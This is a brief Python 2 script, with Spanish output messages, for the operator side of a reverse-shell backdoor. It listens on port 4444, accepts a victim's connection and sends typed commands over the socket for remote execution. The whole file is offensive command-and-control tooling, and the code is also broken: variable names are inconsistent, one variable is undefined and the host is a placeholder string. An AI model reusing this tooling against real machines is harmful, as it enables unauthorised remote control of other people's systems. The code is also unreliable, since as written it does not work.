import socket
import json

class Listener:
    def __init__(self, ip, port):
        Listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        Listener.bind((ip, port))
        Listener.listen(0)
        print("[+] Esperando por conexiones")
        self.connection, address = Listener.accept()
        print("[+] Tenemos una conexion de " + str(address))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_recive(self, data):
        json_data = ""
        while True:
            try:
                json_data = self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def ejecutar_remoto(self, command):
        self.reliable_send(command)
        return self.reliable_recive(data)


    def run(self):
        while True:
            command = raw_input(">> ")
            result = self.ejecutar_remoto(command)
            print(result)

escuchar = Listener("ip", 4444)
escuchar.run()
